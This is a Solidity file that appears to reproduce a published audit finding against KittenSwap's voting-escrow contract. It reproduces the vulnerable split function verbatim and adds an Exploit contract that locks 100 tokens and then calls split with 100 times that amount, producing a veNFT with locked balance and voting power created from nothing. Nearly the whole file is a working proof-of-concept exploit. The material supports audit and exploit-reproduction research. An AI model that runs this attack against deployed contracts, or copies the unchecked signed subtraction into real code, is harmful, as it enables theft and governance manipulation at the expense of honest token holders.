// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of KittenSwap finding 58010 (C-01):
// "`split` can be abused to create `locked` data with an arbitrary `amount`".
//
// Real audited source (the vulnerable `split` function is reproduced VERBATIM
// from the finding's embedded solidity block; the vulnerable line is marked @>):
//   protocol  KittenSwap (voting-escrow `veKitten` NFT)
//   fn        VotingEscrow.split(uint _from, uint _amount)
//   report    github.com/pashov/audits/blob/master/team/md/
//             KittenSwap-security-review_2025-05-07.md  (Pashov Audit Group)
//
// Root cause: `split` never validates `_amount` against the token's locked
// balance. `value` (the original locked amount) and `_splitAmount` (the caller's
// arbitrary `_amount` cast to int128) are BOTH signed int128, so on the @> line
// `value - _splitAmount` producing a NEGATIVE result does NOT revert in ^0.8.0
// (Solidity's checked arithmetic only reverts on wrap past int128's ±range, and
// a small-minus-large signed result is a perfectly valid negative int128).
// token1 is minted that broken negative amount, and token2 is minted the FULL
// `_splitAmount` — so a user who locked X can split with _amount = 100*X and walk
// away holding a veNFT whose locked.amount is 100*X: voting power / balance /
// withdrawable underlying minted from nothing (finding's own PoC: locked 1e26 in,
// split token out 1e28 — exactly 100x).
//
// The `split` body is byte-for-byte the audited source. Non-vulnerable
// dependencies (the escrowed ERC20, NFT ownership/mint/burn, `_createSplitNFT`,
// `_checkpoint`, `_isApprovedOrOwner`, `create_lock`) are faithful minimal
// doubles with real token transfers and real accounting.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double for the escrowed KITTEN token.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the voting-escrow `veKitten`. `split` is reproduced
// VERBATIM from the audited source.
// ─────────────────────────────────────────────────────────────────────────────
contract VotingEscrow {
    struct LockedBalance {
        int128 amount;
        uint end;
    }

    MiniToken internal immutable token;
    uint internal constant MAXTIME = 2 * 365 * 86400; // 2 years, standard ve max-lock

    // ── ve / NFT state ──
    uint public tokenId; // running NFT id counter
    mapping(uint => LockedBalance) public locked;
    mapping(uint => address) public ownerOf;
    mapping(uint => uint) public attachments;
    mapping(uint => bool) public voted;

    event Split(
        uint indexed _from,
        uint _tokenId1,
        uint _tokenId2,
        address _sender,
        uint _splitAmount1,
        uint _splitAmount2,
        uint _locktime,
        uint _ts
    );

    constructor(MiniToken _token) {
        token = _token;
    }

    // ── faithful doubles for the non-vulnerable helpers `split` depends on ──

    function _isApprovedOrOwner(address _spender, uint _tokenId) internal view returns (bool) {
        return ownerOf[_tokenId] == _spender;
    }

    function _mint(address _to, uint _tokenId) internal {
        ownerOf[_tokenId] = _to;
    }

    function _burn(uint _tokenId) internal {
        ownerOf[_tokenId] = address(0);
    }

    /// @dev ve supply/bias bookkeeping. Not the vulnerable path; a no-op double
    ///      that must simply not revert (real `_checkpoint` updates voting-power
    ///      history, which does not gate the split accounting bug).
    function _checkpoint(uint, LockedBalance memory, LockedBalance memory) internal {}

    /// @dev Faithful `_createSplitNFT`: mint a fresh veNFT to `_to`, store the
    ///      provided locked data, and checkpoint it (mirrors the audited helper).
    function _createSplitNFT(address _to, LockedBalance memory _newLocked) internal returns (uint _tokenId) {
        _tokenId = ++tokenId;
        _mint(_to, _tokenId);
        locked[_tokenId] = _newLocked;
        _checkpoint(_tokenId, LockedBalance(0, 0), _newLocked);
    }

    /// @notice Faithful lock-creation path — pulls `_value` real tokens and mints
    ///         a veNFT with `locked.amount == _value`. (Not the vulnerable fn.)
    function create_lock(uint _value, uint _lockDuration) external returns (uint _tokenId) {
        require(_value > 0, "zero value");
        token.transferFrom(msg.sender, address(this), _value);
        _tokenId = ++tokenId;
        _mint(msg.sender, _tokenId);
        locked[_tokenId] = LockedBalance(int128(int256(_value)), block.timestamp + _lockDuration);
        _checkpoint(_tokenId, LockedBalance(0, 0), locked[_tokenId]);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // VERBATIM audited `split` (KittenSwap VotingEscrow). @> marks the bug.
    // ─────────────────────────────────────────────────────────────────────────
    function split(
        uint _from,
        uint _amount
    ) external returns (uint _tokenId1, uint _tokenId2) {
        address msgSender = msg.sender;

        require(_isApprovedOrOwner(msgSender, _from));
        require(attachments[_from] == 0 && !voted[_from], "attached");
        require(_amount > 0, "Zero Split");

        // burn old NFT
        LockedBalance memory _locked = locked[_from];
        int128 value = _locked.amount;
        locked[_from] = LockedBalance(0, 0);
        _checkpoint(_from, _locked, LockedBalance(0, 0));
        _burn(_from);

        // set max lock on new NFTs
        _locked.end = block.timestamp + MAXTIME;

        int128 _splitAmount = int128(uint128(_amount));
        // @audit - underflow is possible
        _locked.amount = value - _splitAmount; // already checks for underflow here in ^0.8.0  // @> VULN: no require(_amount <= uint128(value)); signed int128 sub to a NEGATIVE result does NOT revert in ^0.8.0, so token2 below is minted the full arbitrary _splitAmount (e.g. 100x the deposit) — ve balance/voting power created from nothing.
        _tokenId1 = _createSplitNFT(msgSender, _locked);

        _locked.amount = _splitAmount;
        _tokenId2 = _createSplitNFT(msgSender, _locked);

        emit Split(
            _from,
            _tokenId1,
            _tokenId2,
            msgSender,
            uint(uint128(locked[_tokenId1].amount)),
            uint(uint128(_splitAmount)),
            _locked.end,
            block.timestamp
        );
    }
}

/// @dev Marker token: the "unlimited mint" harm here is an internal ve
///      accounting entry (an inflated locked.amount), not a positive ERC20
///      transfer to the attacker inside run(). Per convention the harm
///      magnitude — ve value conjured from nothing — is minted to SINK.
contract MarkerToken {
    string public name = "veKitten balance minted from nothing";
    string public constant symbol = "veKITTEN-MINT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: legitimately lock DEPOSIT (100e18), then `split` with
// _amount = 100 * DEPOSIT and prove the resulting veNFT (token2) carries a
// locked.amount of 100 * DEPOSIT — 100x what was deposited, matching the
// finding's own PoC log (1e26 in, 1e28 out). The excess (99 * DEPOSIT) is ve
// balance / voting power / withdrawable underlying created from nothing and is
// minted to SINK as the harm magnitude.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MiniToken public token;
    VotingEscrow public vuln;
    MarkerToken public marker;

    uint256 internal constant DEPOSIT = 100e18; // attacker legitimately locks 100 KITTEN
    uint256 internal constant MULT = 100; // finding's example: split _amount = 100x
    uint256 internal constant LOCK_DURATION = 7 * 86400; // 1 week lock on the original NFT
    uint256 internal constant OTHER_LIQUIDITY = 100_000e18; // honest lockers' KITTEN backing the escrow

    uint256 public deposited; // what the attacker actually locked
    uint256 public inflatedAmount; // token2 locked.amount after split
    uint256 public mintedFromNothing; // ve value conjured out of thin air

    constructor() {
        token = new MiniToken("Kitten", "KITTEN"); // child nonce 1 (profit/marker-of-value token)
        vuln = new VotingEscrow(token); // child nonce 2 (VULN)
        marker = new MarkerToken(); // child nonce 3 (harm marker)

        // honest lockers' deposits sit in the escrow, backing legitimate ve balances
        token.mint(address(vuln), OTHER_LIQUIDITY);
    }

    function run() external {
        // attacker is funded with only the small legitimate deposit
        token.mint(address(this), DEPOSIT);
        token.approve(address(vuln), type(uint256).max);

        // 1) legitimately create a lock for DEPOSIT -> veNFT with locked.amount == DEPOSIT
        uint id = vuln.create_lock(DEPOSIT, LOCK_DURATION);
        (int128 origAmount, ) = vuln.locked(id);
        deposited = uint256(uint128(origAmount));
        require(deposited == DEPOSIT, "setup: original lock amount");

        // 2) abuse split with an arbitrary _amount = 100 * DEPOSIT. No amount
        //    validation: token1 gets the (negative) value-_splitAmount, token2
        //    gets the full _splitAmount = 100 * DEPOSIT.
        (uint t1, uint t2) = vuln.split(id, MULT * DEPOSIT);
        t1; // token1 carries a broken/negative locked amount (unused)

        (int128 t2Amount, ) = vuln.locked(t2);
        inflatedAmount = uint256(uint128(t2Amount));

        // harm: token2's locked balance is 100x the deposit — ve value from nothing
        mintedFromNothing = inflatedAmount - deposited; // 99 * DEPOSIT
        marker.mint(SINK, mintedFromNothing);

        require(inflatedAmount == MULT * DEPOSIT, "split did not inflate 100x");
        require(inflatedAmount > deposited * 50, "no meaningful ve inflation");
        require(inflatedAmount > OTHER_LIQUIDITY / 20, "inflated ve claim is unbacked at scale");
        require(marker.balanceOf(SINK) == mintedFromNothing, "harm not recorded");
    }
}
